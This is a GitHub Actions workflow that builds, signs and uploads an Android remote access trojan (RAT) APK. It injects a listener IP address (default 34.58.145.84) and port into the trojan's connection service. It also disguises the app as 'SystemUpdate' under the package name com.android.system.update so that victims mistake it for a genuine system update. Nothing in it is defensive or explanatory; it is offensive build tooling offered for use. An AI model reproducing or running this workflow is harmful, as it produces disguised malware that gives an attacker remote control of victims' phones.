name: Build RAT APK

on:
  workflow_dispatch:
    inputs:
      lhost:
        description: 'Listener IP Address'
        required: true
        default: '34.58.145.84'
      lport:
        description: 'Listener Port'
        required: true
        default: '5555'
      app_name:
        description: 'Application Name'
        required: true
        default: 'SystemUpdate'
      package_name:
        description: 'Package Name (e.g., com.android.update)'
        required: true
        default: 'com.android.system.update'

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'temurin'

    - name: Setup Android SDK
      run: |
        wget https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
        unzip commandlinetools-linux-9477386_latest.zip
        mkdir -p $ANDROID_HOME/cmdline-tools
        mv cmdline-tools $ANDROID_HOME/cmdline-tools/latest
        export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin
        yes | sdkmanager --licenses
        sdkmanager "platform-tools" "platforms;android-33" "build-tools;33.0.0"

    - name: Update Configuration with Listener Details
      run: |
        # Update ConnectionService.java with LHOST and LPORT
        if [ -f app/src/main/java/com/fly0rakoon/rat/services/ConnectionService.java ]; then
          sed -i "s/private static String SERVER_IP = \".*\";/private static String SERVER_IP = \"${{ github.event.inputs.lhost }}\";/" app/src/main/java/com/fly0rakoon/rat/services/ConnectionService.java
          sed -i "s/private static int SERVER_PORT = .*;/private static int SERVER_PORT = ${{ github.event.inputs.lport }};/" app/src/main/java/com/fly0rakoon/rat/services/ConnectionService.java
        fi
        
        # Update app name in strings.xml if it exists
        if [ -f app/src/main/res/values/strings.xml ]; then
          sed -i "s/<string name=\"app_name\">.*<\/string>/<string name=\"app_name\">${{ github.event.inputs.app_name }}<\/string>/" app/src/main/res/values/strings.xml
        fi
        
        # Remove package attribute from AndroidManifest.xml if it exists
        if [ -f app/src/main/AndroidManifest.xml ]; then
          sed -i 's/package="[^"]*"//' app/src/main/AndroidManifest.xml
        fi
        
        # Update build.gradle with package name and namespace
        if [ -f app/build.gradle ]; then
          sed -i "s/applicationId \".*\"/applicationId \"${{ github.event.inputs.package_name }}\"/" app/build.gradle
          sed -i "s/namespace \".*\"/namespace \"${{ github.event.inputs.package_name }}\"/" app/build.gradle
        fi

    - name: Build APK
      run: |
        chmod +x gradlew
        ./gradlew assembleRelease --no-daemon

    - name: Sign APK
      run: |
        # Generate keystore for signing
        keytool -genkey -v -keystore release.keystore -alias ratkey -keyalg RSA -keysize 2048 -validity 10000 -storepass 123456 -keypass 123456 -dname "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown"
        
        # Sign the APK
        $ANDROID_HOME/build-tools/33.0.0/apksigner sign --ks release.keystore --ks-pass pass:123456 --key-pass pass:123456 app/build/outputs/apk/release/app-release-unsigned.apk || echo "Signing failed but continuing"
        
        # Align and rename
        $ANDROID_HOME/build-tools/33.0.0/zipalign -v -p 4 app/build/outputs/apk/release/app-release-unsigned.apk ${{ github.event.inputs.app_name }}_${{ github.event.inputs.lhost }}.apk || cp app/build/outputs/apk/release/app-release-unsigned.apk ${{ github.event.inputs.app_name }}_${{ github.event.inputs.lhost }}.apk

    - name: Upload APK Artifact
      uses: actions/upload-artifact@v4  # Upgraded to v4
      with:
        name: rat-apk
        path: ${{ github.event.inputs.app_name }}_${{ github.event.inputs.lhost }}.apk
        retention-days: 1
        if-no-files-found: warn
